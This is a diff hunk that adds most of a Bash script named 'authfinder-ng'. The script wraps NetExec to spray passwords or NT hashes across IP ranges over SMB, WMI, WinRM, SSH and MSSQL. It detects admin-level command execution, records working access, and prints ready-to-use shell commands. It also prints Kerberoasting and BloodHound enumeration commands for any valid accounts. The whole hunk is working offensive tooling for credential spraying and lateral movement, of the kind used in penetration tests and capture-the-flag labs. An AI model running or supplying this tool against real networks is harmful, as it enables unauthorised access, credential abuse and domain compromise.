+                    print_fail "  ${tool} failed"
+                    analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+                fi
+                return 1
+            fi
+            echo "$out" | grep -q "Pwn3d!" && return 0
+            echo "$out" | grep -q "\[+\]" && ! echo "$out" | grep -qi "Executed" && {
+                print_auth "  ${tool}: AUTH OK as ${user} on ${ip} — not local admin"
+                record_auth_only "$ip" "$tool" "$user" "$cred"
+                return 1; }
+            [[ $rc -eq 0 && -z "$out" ]] && { print_fail "  ${tool} failed silently"; return 1; }
+            return 0 ;;
+
+        wmi)
+            if echo "$out" | grep -q "\[-\]"; then
+                if echo "$out" | grep -q "\[+\]"; then
+                    print_auth "  wmi: CREDS VALID as ${user} on ${ip} — not local admin"
+                    record_auth_only "$ip" "$tool" "$user" "$cred"
+                else
+                    print_fail "  wmi failed"
+                    analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+                fi
+                return 1
+            fi
+            # NXC WMI success: [+] without [-], and/or "Executed"
+            if echo "$out" | grep -q "\[+\]"; then
+                echo "$out" | grep -qi "Executed" && return 0
+                echo "$out" | grep -q "Pwn3d!" && return 0
+                # [+] only (auth confirmed, check if Pwn3d!)
+                print_auth "  wmi: AUTH OK as ${user} on ${ip} — not local admin"
+                record_auth_only "$ip" "$tool" "$user" "$cred"
+                return 1
+            fi
+            [[ $rc -eq 0 && -z "$out" ]] && { print_fail "  wmi failed silently"; return 1; }
+            return 0 ;;
+
+        ssh)
+            echo "$out" | grep -q "\[-\]" && {
+                print_fail "  ssh failed"
+                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+                return 1; }
+            if echo "$out" | grep -q "Linux - Shell" && [[ "$LINUX_MODE" == "false" ]]; then
+                print_warn "  SSH auth OK on Linux target — use --linux"
+                record_auth_only "$ip" "$tool" "$user" "$cred"
+                return 1
+            fi
+            return 0 ;;
+
+        mssql)
+            echo "$out" | grep -qi "EXECUTE permission.*denied" && {
+                print_warn "  MSSQL: auth OK but xp_cmdshell denied — need sysadmin role"
+                record_auth_only "$ip" "$tool" "$user" "$cred"
+                return 1; }
+            echo "$out" | grep -qi "ERROR\|Login failed" && {
+                print_fail "  mssql failed"
+                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
+                return 1; }
+            return 0 ;;
+    esac
+
+    print_fail "  ${tool} failed (rc=${rc})"
+    return 1
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# RECORDING
+# ═══════════════════════════════════════════════════════════════════════════
+record_success() {
+    local ip="$1" tool="$2" user="$3" cred="$4" shell_cmd="$5" is_admin="$6"
+    ( flock -x 200
+      echo "${ip}|${tool}|${user}|${cred}|${shell_cmd}|${is_admin}" >> "$RESULTS_FILE"
+    ) 200>"$LOCK_FILE"
+}
+
+record_auth_only() {
+    local ip="$1" tool="$2" user="$3" cred="$4"
+    ( flock -x 200
+      grep -q "^${ip}|.*|${user}|" "$AUTH_FILE" 2>/dev/null && return
+      echo "${ip}|${tool}|${user}|${cred}" >> "$AUTH_FILE"
+    ) 200>"$LOCK_FILE"
+}
+
+record_failure() {
+    local user="$1"
+    [[ ! -f "$LOCK_FILE" ]] && return
+    ( flock -x 200
+      echo "$user" >> "$FAIL_FILE"
+      local cnt; cnt=$(grep -c "^${user}$" "$FAIL_FILE" 2>/dev/null || echo 0)
+      (( cnt >= LOCKOUT_THRESHOLD )) && \
+          echo -e "${BRED}[LOCKOUT RISK] '${user}' failed ${cnt}x — consider stopping!${NC}"
+    ) 200>"$LOCK_FILE"
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# CHAIN
+# ═══════════════════════════════════════════════════════════════════════════
+run_chain() {
+    local user="$1" ip="$2" cred="$3" use_hash="$4" command="$5" domain="${6:-}"
+    shift 6
+    local -a tool_list=("$@")
+    [[ ${#tool_list[@]} -eq 0 ]] && tool_list=("${VALID_TOOLS[@]}")
+
+    if [[ "$TOOLS_SPECIFIED" == "true" ]]; then
+        local -a expanded=()
+        for t in "${tool_list[@]}"; do
+            [[ "$t" == "winrm" ]] && expanded+=(winrm winrm-ssl) || expanded+=("$t")
+        done
+        tool_list=("${expanded[@]}")
+    fi
+
+    local any_exec=false
+
+    for tool in "${tool_list[@]}"; do
+        run_tool "$tool" "$user" "$ip" "$cred" "$use_hash" "$command" "$domain"
+        local rc=$?
+
+        if [[ $rc -eq 0 ]]; then
+            any_exec=true
+            local is_admin; is_admin=$(get_ctx "$ip" "$user" "IS_ADMIN")
+            local is_da;    is_da=$(get_ctx "$ip" "$user" "IS_DA")
+            local shell_cmd; shell_cmd=$(build_shell_cmd "$tool" "$user" "$ip" "$cred" "$use_hash" "$domain")
+            record_success "$ip" "$tool" "$user" "$cred" "$shell_cmd" "$is_admin"
+
+            lprint ""
+            local admin_tag=""; [[ "$is_admin" == "true" ]] && admin_tag=" ${BRED}[ADMIN]${BGRN}${BOLD}"
+            local da_tag="";    [[ "$is_da" == "true" ]]    && da_tag=" ${BRED}[DOMAIN ADMIN]${BGRN}${BOLD}"
+            lprint "${BGRN}${BOLD}  ╔═══════════════════════════════════════════════════════════════╗${NC}"
+            lprint "${BGRN}${BOLD}  ║  ACCESS: ${ip} via ${tool} as ${user}${admin_tag}${da_tag}${NC}"
+            lprint "${BGRN}${BOLD}  ╚═══════════════════════════════════════════════════════════════╝${NC}"
+
+            [[ "$SHOW_NEXT_STEPS" == "true" ]] && \
+                next_steps "$tool" "$ip" "$user" "$cred" "$use_hash" "$domain"
+
+            [[ "$RUN_ALL" == "false" ]] && return 0
+        fi
+
+        [[ "$SPRAY_DELAY" -gt 0 ]] && sleep "$SPRAY_DELAY"
+    done
+
+    $any_exec || record_failure "$user"
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# IP EXECUTOR
+# ═══════════════════════════════════════════════════════════════════════════
+execute_on_ip() {
+    local user="$1" ip="$2" cred="$3" use_hash="$4" command="$5" domain="${6:-}"
+    shift 6
+    local -a tool_list=("$@")
+
+    print_sep
+    lprint "${INFO} ${BOLD}Target:${NC} ${CYAN}${ip}${NC}  ${BOLD}User:${NC} ${YELLOW}${user}${NC}  ${BOLD}Auth:${NC} $( [[ "$use_hash" == "1" ]] && echo "PTH" || echo "Password" )"
+
+    local -a viable=()
+
+    if [[ "$SKIP_PORTSCAN" == "true" ]]; then
+        viable=("${tool_list[@]}")
+        [[ ${#viable[@]} -eq 0 ]] && viable=("${VALID_TOOLS[@]}")
+        lprint "    ${DIM}(portscan skipped)${NC}"
+        check_port "$ip" 3389 && echo "3389" >> "${TMP_DIR}/ports_${ip//./_}.txt" 2>/dev/null || true
+    else
+        print_info "  Port scanning ${ip}..."
+        mapfile -t viable < <(scan_ports_for_ip "$ip" "${tool_list[@]}")
+
+        if [[ ${#viable[@]} -eq 0 ]]; then
+            print_fail "  No required ports open on ${ip}"
+            print_tip "Use --skip-portscan to attempt anyway"
+            return
+        fi
+
+        local -a disp=()
+        for t in "${viable[@]}"; do
+            local dt="$t"; [[ "$t" == "winrm-ssl" ]] && dt="winrm(SSL)"
+            [[ ! " ${disp[*]} " =~ " $dt " ]] && disp+=("$dt")
+        done
+        local rdp_note=""
+        ip_has_port "$ip" 3389 && [[ ! " ${viable[*]} " =~ " rdp " ]] && \
+            rdp_note="${DIM} +RDP(visible,not-in-chain)${NC}"
+        lprint "    ${BLUE}[i]${NC} Viable: ${CYAN}${disp[*]}${NC}${rdp_note}"
+    fi
+
+    run_chain "$user" "$ip" "$cred" "$use_hash" "$command" "$domain" "${viable[@]}"
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# SUMMARY
+# ═══════════════════════════════════════════════════════════════════════════
+print_summary() {
+    lprint ""
+    lprint "${BOLD}${BLUE}══════════════════════════════════════════════════════════════════${NC}"
+    lprint "${BOLD}${BLUE}  SCAN COMPLETE — SUMMARY${NC}"
+    lprint "${BOLD}${BLUE}══════════════════════════════════════════════════════════════════${NC}"
+
+    local -a exec_entries=() auth_entries=()
+    [[ -f "$RESULTS_FILE" ]] && mapfile -t exec_entries < "$RESULTS_FILE"
+    [[ -f "$AUTH_FILE"    ]] && mapfile -t auth_entries  < "$AUTH_FILE"
+
+    # Exec successes
+    if [[ ${#exec_entries[@]} -gt 0 ]]; then
+        lprint ""
+        lprint "${BGRN}${BOLD}  ╔══ COMMAND EXECUTION ACCESS — ${#exec_entries[@]} target(s) ══╗${NC}"
+        lprint ""
+        lprint "  $(printf '%-17s %-11s %-20s %-6s %s' 'IP' 'TOOL' 'USER' 'ADMIN' 'SHELL')"
+        lprint "  $(printf '%.0s─' {1..78})"
+        for entry in "${exec_entries[@]}"; do
+            IFS='|' read -r ip tool user cred shell_cmd is_admin <<< "$entry"
+            local adm="${DIM}no${NC}"; [[ "$is_admin" == "true" ]] && adm="${BRED}YES${NC}"
+            lprint "  $(printf "${GREEN}%-17s${NC} ${YELLOW}%-11s${NC} ${CYAN}%-20s${NC} " "$ip" "$tool" "$user")${adm} ${ORANGE}${shell_cmd}${NC}"
+        done
+        lprint ""
+        lprint "  ${BOLD}Ready-to-use shell commands:${NC}"
+        for entry in "${exec_entries[@]}"; do
+            IFS='|' read -r ip tool user cred shell_cmd is_admin <<< "$entry"
+            lprint "  ${DIM}# ${ip} — ${tool} as ${user}$( [[ "$is_admin" == "true" ]] && echo " [ADMIN]" )${NC}"
+            lprint "  ${ORANGE}${shell_cmd}${NC}"
+            lprint ""
+        done
+    fi
+
+    # Auth-only hits
+    if [[ ${#auth_entries[@]} -gt 0 ]]; then
+        lprint ""
+        lprint "${YELLOW}${BOLD}  ╔══ VALID CREDENTIALS (no exec access): ${#auth_entries[@]} hit(s) ══╗${NC}"
+        lprint "  ${DIM}Credentials valid — user is not local admin. Use for enumeration.${NC}"
+        lprint ""
+        lprint "  $(printf '%-17s %-11s %-20s' 'IP' 'PROTO' 'USER')"
+        lprint "  $(printf '%.0s─' {1..50})"
+        for entry in "${auth_entries[@]}"; do
+            IFS='|' read -r ip tool user cred <<< "$entry"
+            lprint "  $(printf "${YELLOW}%-17s${NC} %-11s ${CYAN}%-20s${NC}" "$ip" "$tool" "$user")"
+        done
+        lprint ""
+        lprint "  ${BOLD}Enumeration commands for valid accounts:${NC}"
+        local -A seen_auth=()
+        for entry in "${auth_entries[@]}"; do
+            IFS='|' read -r ip tool user cred <<< "$entry"
+            local akey="${ip}:${user}"
+            [[ -n "${seen_auth[$akey]:-}" ]] && continue
+            seen_auth["$akey"]=1
+            local nxc_a="-u '${user}' -p '${cred}'"
+            is_nthash "$cred" && nxc_a="-u '${user}' -H '${cred#:}'"
+            lprint "  ${DIM}# ${user} @ ${ip}${NC}"
+            lprint "  ${ORANGE}${NXC_CMD} smb  ${ip} ${nxc_a} --pass-pol 2>/dev/null${NC}"
+            lprint "  ${ORANGE}${NXC_CMD} ldap ${ip} ${nxc_a} --kerberoasting kerberoast_${user}.txt${NC}"
+            lprint "  ${ORANGE}${NXC_CMD} ldap ${ip} ${nxc_a} --bloodhound -c All${NC}"
+            lprint ""
+        done
+    fi
+
+    # All failed
+    if [[ ${#exec_entries[@]} -eq 0 && ${#auth_entries[@]} -eq 0 ]]; then
+        lprint "${FAIL} No access found"
+        lprint ""
+        lprint "  Troubleshooting:"
+        lprint "  • Verify creds: ${NXC_CMD} smb TARGET -u USER -p PASS"
+        [[ -z "$DOMAIN" ]] && lprint "  • Domain creds? Add: -d DOMAIN"
+        lprint "  • Local account? Add: --local-auth"
+        lprint "  • Firewalled? Try: --skip-portscan"
+        lprint "  • Check lockout policy BEFORE retrying more creds"
+        lprint "  • Slow network? --timeout 40 --winrm-timeout 60"
+    fi
+
+    [[ -n "$REPORT_FILE" ]] && { generate_report; lprint "${OK} Report saved: ${BOLD}${REPORT_FILE}${NC}"; }
+    lprint "${BOLD}${BLUE}══════════════════════════════════════════════════════════════════${NC}"
+}
+
+generate_report() {
+    {
+        echo "# authfinder-ng v${VERSION} Report"
+        echo "**Date:** $(date)"
+        echo ""
+        if [[ -f "$RESULTS_FILE" && -s "$RESULTS_FILE" ]]; then
+            echo "## Execution Access"
+            echo "| IP | Tool | User | Admin | Shell Command |"
+            echo "|----|------|------|-------|---------------|"
+            while IFS='|' read -r ip tool user cred shell_cmd is_admin; do
+                echo "| \`${ip}\` | ${tool} | ${user} | ${is_admin} | \`${shell_cmd}\` |"
+            done < "$RESULTS_FILE"
+            echo ""
+        fi
+        if [[ -f "$AUTH_FILE" && -s "$AUTH_FILE" ]]; then
+            echo "## Valid Credentials (no exec)"
+            echo "| IP | Protocol | User |"
+            echo "|----|----------|------|"
+            while IFS='|' read -r ip tool user cred; do
+                echo "| \`${ip}\` | ${tool} | ${user} |"
+            done < "$AUTH_FILE"
+        fi
+    } > "$REPORT_FILE"
+}
+
+cleanup() { [[ -n "$TMP_DIR" && -d "$TMP_DIR" ]] && rm -rf "$TMP_DIR"; }
+
+# ═══════════════════════════════════════════════════════════════════════════
+# USAGE
+# ═══════════════════════════════════════════════════════════════════════════
+usage() {
+    cat << EOF
+${BOLD}${CYAN}authfinder-ng${NC} v${VERSION} — Multi-Protocol Access Discovery Engine
+
+${BOLD}USAGE:${NC}
+  authfinder-ng <target>  -u USER  -p PASS  [-c CMD] [options]
+  authfinder-ng <target>  -u USER  -H HASH  [-c CMD] [options]
+  authfinder-ng <target>  -f CREDS_FILE     [-c CMD] [options]
+  authfinder-ng --install-tools | --check-tools
+
+${BOLD}TARGETS:${NC}
+  10.10.10.1              Single IP          10.10.10.1-50       Range
+  10.10.10,11.1-254       Multi-octet        192.168.0.0/24      CIDR
+  targets.txt             File of IPs/ranges (# comments OK)
+
+${BOLD}AUTHENTICATION:${NC}
+  -u USER  -p PASS        Password auth      -u USER  -H HASH    Pass-the-hash
+  -d DOMAIN               Domain name        -f FILE             Cred file (auto-detects hashes)
+  --local-auth            Force local auth
+
+${BOLD}EXECUTION:${NC}
+  -c CMD                  Command (default: whoami /all)
+  --tools LIST            winrm,smbexec,wmi,ssh,mssql,psexec,atexec,rdp
+  --run-all               Try all tools even after success
+  --linux                 Linux mode (SSH + bash encoding)
+
+${BOLD}OPTIONS:${NC}
+  --skip-portscan         Try all tools regardless of port state
+  --threads N             Parallel threads (default: 10)
+  --timeout N             Command timeout seconds (default: 20)
+  --winrm-timeout N       WinRM timeout (default: 30)
+  --rdp-timeout N         RDP timeout (default: 45)
+  --delay N               Spray delay per attempt (default: 0)
+  --lockout-threshold N   Warn after N per-user failures (default: 3)
+  --no-next-steps         Hide post-exploitation guidance
+  --report FILE           Save markdown report
+  -v                      Verbose/debug output
+
+${BOLD}EXAMPLES:${NC}
+  authfinder-ng 10.10.10.1 -u administrator -p 'P@ss!'
+  authfinder-ng 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee
+  authfinder-ng 10.0.0.1-10 -u jsmith -p pass -d CORP --tools winrm,wmi
+  authfinder-ng 10.0.0.1-50 -f creds.txt --delay 5 --lockout-threshold 2
+  authfinder-ng 172.16.0.1-20 -u root -p toor --linux
+  authfinder-ng 10.0.0.0/24 -u admin -p pass --run-all --report out.md
+  authfinder-ng 10.10.10.1 -u sa -p pass --tools mssql
+
+${BOLD}CRED FILE FORMAT:${NC}
+  user1                            # username
+  Password123                      # password
+  user2
+  aabbccdd11223344aabbccdd11223344 # NT hash (auto-detected)
+  # blank lines and # comments ignored
+
+EOF
+    exit 0
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# ARGUMENT PARSING
+# ═══════════════════════════════════════════════════════════════════════════
+parse_args() {
+    [[ $# -eq 0 ]] && usage
+    IP_RANGE=""; USER=""; PASS=""; HASH=""; COMMAND=""; CRED_FILE=""; TOOL_LIST_STR=""
+
+    local i=0; local -a args=("$@")
+    while [[ $i -lt ${#args[@]} ]]; do
+        local a="${args[$i]}"
+        case "$a" in
+            -h|--help)            usage ;;
+            --install-tools)      install_tools ;;
+            --check-tools)        ONLY_CHECK_TOOLS=true ;;
+            -v|--verbose)         VERBOSE=true ;;
+            --run-all)            RUN_ALL=true ;;
+            --skip-portscan)      SKIP_PORTSCAN=true ;;
+            --linux)              LINUX_MODE=true ;;
+            --local-auth)         LOCAL_AUTH=true ;;
+            --no-next-steps)      SHOW_NEXT_STEPS=false ;;
+            -u|--user)            ((i++)); USER="${args[$i]}" ;;
+            -p|--pass|--password) ((i++)); PASS="${args[$i]}" ;;
+            -H|--hash)            ((i++)); HASH="${args[$i]}" ;;
+            -d|--domain)          ((i++)); DOMAIN="${args[$i]}" ;;
+            -c|--command)         ((i++)); COMMAND="${args[$i]}" ;;
+            -f|--file)            ((i++)); CRED_FILE="${args[$i]}" ;;
+            --tools)              ((i++)); TOOL_LIST_STR="${args[$i]}" ;;
+            --threads)            ((i++)); MAX_THREADS="${args[$i]}" ;;
+            --timeout)            ((i++)); EXEC_TIMEOUT="${args[$i]}" ;;
+            --winrm-timeout)      ((i++)); WINRM_TIMEOUT="${args[$i]}" ;;
+            --rdp-timeout)        ((i++)); RDP_TIMEOUT="${args[$i]}" ;;
+            --delay)              ((i++)); SPRAY_DELAY="${args[$i]}" ;;
+            --lockout-threshold)  ((i++)); LOCKOUT_THRESHOLD="${args[$i]}" ;;
+            --report)             ((i++)); REPORT_FILE="${args[$i]}" ;;
+            -*)
+                echo -e "${RED}[!] Unknown option: ${a}  (--help for usage)${NC}" >&2; exit 1 ;;
+            *)
+                [[ -z "$IP_RANGE" ]] && IP_RANGE="$a" \
+                    || { echo -e "${RED}[!] Unexpected argument: ${a}${NC}" >&2; exit 1; } ;;
+        esac
+        ((i++)) || true
+    done
+
+    [[ -z "$IP_RANGE" && "$ONLY_CHECK_TOOLS" == "false" ]] && \
+        { echo -e "${RED}[!] Target IP range required${NC}" >&2; usage; }
+
+    if [[ "$ONLY_CHECK_TOOLS" == "false" ]]; then
+        [[ -n "$CRED_FILE" && ( -n "$USER" || -n "$PASS" || -n "$HASH" ) ]] && \
+            { echo -e "${RED}[!] Cannot combine -f with -u/-p/-H${NC}" >&2; exit 1; }
+        if [[ -z "$CRED_FILE" ]]; then
+            [[ -z "$USER" ]] && { echo -e "${RED}[!] Need -u USER or -f FILE${NC}" >&2; exit 1; }
+            [[ -z "$PASS" && -z "$HASH" ]] && { echo -e "${RED}[!] Need -p PASS or -H HASH${NC}" >&2; exit 1; }
+            [[ -n "$PASS" && -n "$HASH" ]] && { echo -e "${RED}[!] Cannot use -p and -H together${NC}" >&2; exit 1; }
+        fi
+    fi
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════════════════════
+main() {
+    parse_args "$@"
+
+    TMP_DIR=$(mktemp -d)
+    RESULTS_FILE="${TMP_DIR}/results.txt"
+    AUTH_FILE="${TMP_DIR}/auth_only.txt"
+    FAIL_FILE="${TMP_DIR}/failures.txt"
+    LOCK_FILE="${TMP_DIR}/output.lock"
+    touch "$RESULTS_FILE" "$AUTH_FILE" "$FAIL_FILE" "$LOCK_FILE"
+    trap cleanup EXIT
+
+    banner
+    verify_tools
+    [[ "$ONLY_CHECK_TOOLS" == "true" ]] && exit 0
+
+    # Tool list
+    local -a tool_list=()
+    if [[ "$LINUX_MODE" == "true" ]]; then
+        [[ -n "$TOOL_LIST_STR" ]] && print_warn "--tools ignored in --linux mode"
+        tool_list=(ssh); TOOLS_SPECIFIED=true
+    elif [[ -n "$TOOL_LIST_STR" ]]; then
+        TOOLS_SPECIFIED=true
+        IFS=',' read -ra raw_tools <<< "$TOOL_LIST_STR"
+        for t in "${raw_tools[@]}"; do
+            t="${t,,}"
+            [[ "$t" =~ ^(evil-?winrm|evilwinrm)$ ]] && t="winrm"
+            if [[ ! " ${VALID_TOOLS[*]} " =~ " $t " ]]; then
+                echo -e "${RED}[!] Invalid tool: $t  Valid: ${VALID_TOOLS[*]}${NC}"; exit 1; fi
+            [[ ! " ${tool_list[*]} " =~ " $t " ]] && tool_list+=("$t")
+        done
+    fi
+
+    # Parse IPs
+    local -a ips=()
+    mapfile -t ips < <(parse_ip_range "$IP_RANGE")
+    [[ ${#ips[@]} -eq 0 ]] && { echo -e "${RED}[!] No IPs from: ${IP_RANGE}${NC}"; exit 1; }
+
+    # Parse credentials
+    local -a cred_lines=()
+    if [[ -n "$CRED_FILE" ]]; then
+        mapfile -t cred_lines < <(load_creds_file "$CRED_FILE")
+    else
+        local use_hash=0 cred="$PASS"
+        [[ -n "$HASH" ]] && { cred="$HASH"; use_hash=1; }
+        cred_lines=("${USER}|${cred}|${use_hash}")
+    fi
+
+    local command="${COMMAND:-whoami /all}"
+    local total_tasks=$(( ${#ips[@]} * ${#cred_lines[@]} ))
+    local threads=$(( MAX_THREADS < total_tasks ? MAX_THREADS : total_tasks ))
+    (( threads < 1 )) && threads=1
+
+    echo -e "${BOLD}${BLUE}── Scan Parameters ────────────────────────────────────────────────${NC}"
+    echo -e "${INFO} Targets  : ${BOLD}${#ips[@]}${NC} IPs | Threads: ${BOLD}${threads}${NC}"
+    echo -e "${INFO} Creds    : ${BOLD}${#cred_lines[@]}${NC} set(s)"
+    echo -e "${INFO} Command  : ${YELLOW}${command}${NC}"
+    [[ -n "$DOMAIN" ]]             && echo -e "${INFO} Domain   : ${YELLOW}${DOMAIN}${NC}"
+    [[ "$LOCAL_AUTH" == "true" ]]  && echo -e "${INFO} Mode     : ${YELLOW}Local Auth${NC}"
+    [[ ${#tool_list[@]} -gt 0 ]]   && echo -e "${INFO} Tools    : ${YELLOW}${tool_list[*]}${NC}"
+    [[ "$SKIP_PORTSCAN" == "true" ]] && echo -e "${WARN} ${YELLOW}Portscan disabled — all tools will be attempted${NC}"
+    [[ "$SPRAY_DELAY" -gt 0 ]]     && echo -e "${INFO} Delay    : ${YELLOW}${SPRAY_DELAY}s per attempt${NC}"
+    echo ""
+
+    # Execute
+    for ip in "${ips[@]}"; do
+        for cred_line in "${cred_lines[@]}"; do
+            while [[ $(jobs -r 2>/dev/null | wc -l) -ge $threads ]]; do sleep 0.1; done
+            IFS='|' read -r user cred use_hash <<< "$cred_line"
+            ( execute_on_ip "$user" "$ip" "$cred" "$use_hash" "$command" "$DOMAIN" "${tool_list[@]}" ) &
+        done
+    done
+
+    wait
+    print_summary
+}
+
+main "$@"
